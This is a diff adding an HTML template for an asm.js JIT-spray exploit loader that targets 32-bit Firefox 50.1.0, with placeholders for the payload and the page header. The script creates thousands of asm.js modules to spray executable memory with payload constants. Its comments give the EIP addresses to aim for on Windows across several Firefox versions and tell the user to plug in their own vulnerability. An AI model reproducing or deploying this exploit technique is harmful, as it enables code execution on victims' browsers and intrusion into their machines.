@@ -1,0 +1,53 @@
+<!DOCTYPE HTML>
+
+<!--
+
+    ASM.JS JIT SPRAY
+
+    works on 32-bit Firefox - successfully tested with 50.1.0
+
+    STATIC FLOAT POOL LOADER - generated via:
+    %CMDLINE%
+
+    (C) Rh0
+
+-->
+
+<head>
+<meta charset=UTF-8 />
+<script>
+(() => {
+    asm_js_module = function(stdlib, ffi){
+        "use asm"
+        var foo = ffi.foo
+        function asm_js_function(){
+            var val = 0.0
+            val = +foo(
+%PAYLOAD%
+            return +val;
+
+        }
+        return asm_js_function
+    };
+
+    modules = new Array(0x2000).fill(null).map(
+        region => asm_js_module(window, {foo: () => 0})
+    )
+
+    /* GET EIP CONTROL WITH YOUR VULN HERE */
+    /* SET EIP TO 0x1c1c3010 ON WINDOWS 32-bit*/
+    /* You may need to adjust this address dependent on your vuln and version */
+    alert("Set EIP to 0x1c1c3010 (32-bit Firefox 50.1.0 on Windows) with your vuln here")
+    // Fx 44.0.2 0x1c1c3b08
+    // Fx 46.0.1 0x1c1c2f78
+})()
+
+</script>
+</head>
+<body style=background:black>
+<h1 style=color:green>
+%HEADER%
+</h1>
+
+</body>
+</html>
